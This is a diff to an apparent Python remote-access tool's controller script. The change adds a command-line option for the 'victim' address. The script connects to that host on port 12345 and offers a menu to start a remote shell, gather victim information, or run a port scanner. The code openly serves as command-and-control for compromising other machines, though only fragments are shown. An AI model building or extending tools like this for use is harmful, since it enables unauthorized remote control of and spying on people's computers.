@@ -1,7 +1,7 @@
 from scapy.layers.inet import IP, TCP
 from scapy.all import *
 import socket
-
+import argparse
 
 class Shell:
 
@@ -76,7 +76,15 @@ class PortScanner:
         print("\033[32m[*] Scanning completed in {}\033[0m".format(final_time))
 
 
-malware_addr = input("[*] Enter the address of the victim: ")
+parser = argparse.ArgumentParser()
+parser.add_argument("-a", "--address", metavar="", type=str, help="Enter the IP address to connect to")
+args = parser.parse_args()
+address_option = args.address
+
+if address_option is None:
+    malware_addr = input("[*] Enter the address of the victim: ")
+else:
+    malware_addr = address_option
 serv_addr = (malware_addr, 12345)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -96,6 +104,7 @@ print("\n----------------------")
 message = input(
     "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start the PortScanner.\n4. Type exit to quit\n\nAnswer: ")
 print("\n----------------------")
+
 while message != "exit":
     if message == "1":
         shell.set_next_command(True)
